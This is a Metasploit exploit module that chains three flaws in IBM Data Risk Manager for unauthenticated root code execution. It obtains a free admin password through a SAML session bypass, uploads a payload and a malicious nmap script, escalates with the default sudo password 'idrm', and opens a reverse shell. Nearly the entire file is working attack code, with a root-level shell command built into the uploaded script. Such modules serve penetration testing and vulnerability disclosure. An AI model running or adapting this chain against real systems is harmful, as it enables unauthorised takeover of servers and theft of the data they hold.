##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'IBM Data Risk Manager Unauthenticated Remote Code Execution',
        'Description' => %q{
          IBM Data Risk Manager (IDRM) contains three vulnerabilities that can be chained by
          an unauthenticated attacker to achieve remote code execution as root.
          The first is an unauthenticated bypass, followed by a command injection as the server user
          and finally abuse of an insecure default password.
          This module exploits all three vulnerabilities, giving the attacker a root shell.
          At the time of disclosure, this is a 0 day. Versions 2.0.3 and below are confirmed to be
          affected, and the latest 2.0.6 is most likely affected too.
        },
        'Author' =>
          [
            'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and Metasploit module
          ],
        'License' => MSF_LICENSE,
        'References' =>
          [
            [ 'CVE', 'TODO' ],
            [ 'CVE', 'TODO' ],
            [ 'CVE', 'TODO' ],
            [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/IBM/ibm_drm/ibm_drm_rce.md' ],
          ],
        'Platform' => 'linux',
        'Arch' => [ ARCH_X86, ARCH_X64 ],
        'Targets' =>
          [
            [ 'IBM Data Risk Manager <= 2.0.3 (<= 2.0.6 possibly affected)', {} ]
          ],
        'Privileged' => true,
        'DefaultOptions' =>
          {
            'WfsDelay' => 15,
            'PAYLOAD' => 'linux/x64/shell_reverse_tcp'
          },
        'DefaultTarget' => 0,
        'DisclosureDate' => 'Apr 21 2020'
      )
    )

    register_options(
      [
        OptPort.new('RPORT', [true, 'The target port', 8443]),
        OptBool.new('SSL', [true, 'Connect with TLS', true]),
        OptString.new('TARGETURI', [ true, 'Default server path', '/']),
      ]
    )
  end

  def check
    # at the moment there is no better way to detect AND be stealthy about it
    session_id = rand_text_alpha(5..12)
    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], 'albatross', 'saml', 'idpSelection'),
      'method' => 'GET',
      'vars_get' => {
        'id' => session_id,
        'userName' => 'admin'
      }
    })
    if res && (res.code == 302) &&
       res.headers['Location'].include?('localhost:8765') &&
       res.headers['Location'].include?('saml/idpSelection')
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Unknown
  end

  # post-exploitation:
  # - delete the .enc files that were uploaded (register_file_for_cleanup seems to crap out)
  def on_new_session(client)
    if client.type == 'meterpreter'
      # stdapi must be loaded before we can use fs.file
      client.core.use('stdapi') if !client.ext.aliases.include?('stdapi')
      client.fs.file.rm(@script_filepath)
      client.fs.file.rm(@payload_filepath)
    else
      client.shell_command_token("rm #{@script_filepath}")
      client.shell_command_token("rm #{@payload_filepath}")
    end
  end

  # version 2.0.1 runs as root, so we need to change the path to where we deploy the patches
  def get_patches_path(cookie, csrf)
    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], 'albatross', 'getAppInfo'),
      'method' => 'GET',
      'cookie' => cookie,
      'headers' => { 'CSRF-TOKEN' => csrf }
    })

    if res && (res.code == 200)
      if res.body =~ /appVersion\":\"2.0.1\"/
        print_status("#{peer} - Detected IBM Data Risk Manager version 2.0.1")
        return '/root/agile3/patches/'
      end
    end
    print_status("#{peer} - Detected IBM Data Risk Manager version 2.0.2 or above")
    return '/home/a3user/agile3/patches/'
  end

  def exploit
    # step 1: create a session ID and try to make it stick
    session_id = rand_text_alpha(5..12)
    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], 'albatross', 'saml', 'idpSelection'),
      'method' => 'GET',
      'vars_get' => {
        'id' => session_id,
        'userName' => 'admin'
      }
    })
    if res && (res.code = !302)
      fail_with(Failure::Unknown, "#{peer} - Failed to \"stick\" session ID")
    else
      print_good("#{peer} - Successfully \"stickied\" our session ID #{session_id}")
    end

    # step 2: give the session ID to the server and have it grant us a free admin password
    post_data = Rex::MIME::Message.new
    post_data.add_part('', nil, nil, content_disposition = 'form-data; name="deviceid"')
    post_data.add_part(rand_text_alpha(8..15), nil, nil, content_disposition = 'form-data; name="password"')
    post_data.add_part('admin', nil, nil, content_disposition = 'form-data; name="username"')
    post_data.add_part('', nil, nil, content_disposition = 'form-data; name="clientDetails"')
    post_data.add_part(session_id, nil, nil, content_disposition = 'form-data; name="sessionId"')

    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], 'albatross', 'user', 'login'),
      'method' => 'POST',
      'data' => post_data.to_s,
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}"
    })
    if res && (res.code == 200) && res.body[/\"data\":\"([0-9a-f\-]{36})/]
      password = Regexp.last_match(1)
      print_good("#{peer} - We have obtained a new admin password #{password}")

      # step 3: login and get an authenticated cookie
      res = send_request_cgi({
        'uri' => normalize_uri(datastore['TARGETURI'], 'albatross', 'login'),
        'method' => 'POST',
        'vars_post' => {
          'userName' => 'admin',
          'password' => password
        }
      })
      if res && (res.code == 302) && res.get_cookies
        print_good("#{peer} - ... and are authenticated as an admin!")
        cookie = res.get_cookies
        url = res.redirection.to_s

        # step 4: obtain CSRF header in order to be able to make valid requests
        res = send_request_cgi({
          'uri' => url,
          'method' => 'GET',
          'cookie' => cookie
        })
        if res && (res.code == 200) && res.body =~ /var csrfToken \= \"([0-9a-f\-]{36})\";/
          csrf = Regexp.last_match(1)
          patches_path = get_patches_path(cookie, csrf)

          # step 5: upload our payload
          payload_file = rand_text_alpha(5..12) + '.enc'
          post_data = Rex::MIME::Message.new
          post_data.add_part(generate_payload_exe, 'application/octet-stream', 'binary', content_disposition = "form-data; name=\"patchFiles\"; filename=\"#{payload_file}\"")

          res = send_request_cgi({
            'uri' => normalize_uri(datastore['TARGETURI'], 'albatross', 'upload', 'patch'),
            'method' => 'POST',
            'cookie' => cookie,
            'headers' => { 'CSRF-TOKEN' => csrf },
            'data' => post_data.to_s,
            'ctype' => "multipart/form-data; boundary=#{post_data.bound}"
          })
          if res && (res.code == 200)
            print_good("#{peer} - We have uploaded our payload... ")

            # step 6: upload our script file
            # nmap will run as a3user (the server user), which has a default password of "idrm".
            # a3user has sudo access, so that means we run as root!
            # However let's do some basic error checking: if somehow the a3user password was changed and we cannot sudo
            # to execute as root, we ensure our payload still executes as a3user.
            #
            # Note: for version 2.0.1, the above is not necessary as nmap runs as root. However, leave it anyway for simplicity.
            script_file = rand_text_alpha(5..12) + '.enc'
            @script_filepath = patches_path + script_file
            @payload_filepath = patches_path + payload_file
            rand_file = rand_text_alpha(5..12)
            cmd = "chmod +x #{@payload_filepath}; echo idrm | sudo -S whoami > /tmp/#{rand_file};"
            cmd += " root=`cat /tmp/#{rand_file}`;"
            cmd += " if [ $root == 'root' ]; then sudo #{@payload_filepath};"
            cmd += " else #{@payload_filepath}; fi; rm /tmp/#{rand_file}"
            script_file_contents = "os.execute(\"#{cmd}\")"

            post_data = Rex::MIME::Message.new
            post_data.add_part(script_file_contents, 'application/octet-stream', 'binary', content_disposition = "form-data; name=\"patchFiles\"; filename=\"#{script_file}\"")

            res = send_request_cgi({
              'uri' => normalize_uri(datastore['TARGETURI'], 'albatross', 'upload', 'patch'),
              'method' => 'POST',
              'cookie' => cookie,
              'headers' => { 'CSRF-TOKEN' => csrf },
              'data' => post_data.to_s,
              'ctype' => "multipart/form-data; boundary=#{post_data.bound}"
            })

            if res && (res.code == 200)
              print_good("#{peer} - and our nmap script file!")

              # step 7: we need to authenticate again to get a Bearer token (instead of the cookie we already have)
              post_data = Rex::MIME::Message.new
              post_data.add_part('', nil, nil, content_disposition = 'form-data; name="deviceid"')
              post_data.add_part(password, nil, nil, content_disposition = 'form-data; name="password"')
              post_data.add_part('admin', nil, nil, content_disposition = 'form-data; name="username"')
              post_data.add_part('', nil, nil, content_disposition = 'form-data; name="clientDetails"')

              res = send_request_cgi({
                'uri' => normalize_uri(datastore['TARGETURI'], 'albatross', 'user', 'login'),
                'method' => 'POST',
                'data' => post_data.to_s,
                'ctype' => "multipart/form-data; boundary=#{post_data.bound}"
              })
              if res && (res.code == 200) && res.body =~ /\"data\":\{\"access_token\":\"([0-9a-f\-]{36})\",\"token_type\":\"bearer\"/
                bearer = Regexp.last_match(1)
                print_good("#{peer} - Bearer token #{bearer} obtained, wait for the final step where we invoke nmap...")

                # step 8 and final: invoke the nmap scan with our script file
                script = "--script=#{@script_filepath}"
                post_data = Rex::MIME::Message.new
                post_data.add_part('', nil, nil, content_disposition = 'form-data; name="clientDetails"')
                post_data.add_part('1', nil, nil, content_disposition = 'form-data; name="type"')
                post_data.add_part('', nil, nil, content_disposition = 'form-data; name="portRange"')
                post_data.add_part(script, nil, nil, content_disposition = 'form-data; name="ipAddress"')

                res = send_request_cgi({
                  'uri' => normalize_uri(datastore['TARGETURI'], 'albatross', 'restAPI', 'v2', 'nmap', 'run', 'scan', rand(99 + 1).to_s),
                  'method' => 'POST',
                  'headers' => { 'Authorization' => "Bearer #{bearer}" },
                  'data' => post_data.to_s,
                  'ctype' => "multipart/form-data; boundary=#{post_data.bound}"
                })
                if res && (res.code == 200)
                  print_good("#{peer} - Shell incoming!")
                  handler
                else
                  fail_with(Failure::Unknown, "#{peer} - Failed to run nmap scan.")
                end
              else
                fail_with(Failure::Unknown, "#{peer} - Failed to obtain Bearer token.")
              end
            else
              fail_with(Failure::Unknown, "#{peer} - Failed to upload nmap script file.")
            end
          else
            fail_with(Failure::Unknown, "#{peer} - Failed to upload payload.")
          end
        else
          fail_with(Failure::Unknown, "#{peer} - Failed to authenticate obtain CSRF cookie.")
        end
      else
        fail_with(Failure::Unknown, "#{peer} - Failed to authenticate as an admin.")
      end
    else
      fail_with(Failure::Unknown, "#{peer} - Failed to obtain the admin password.")
    end
  end
end
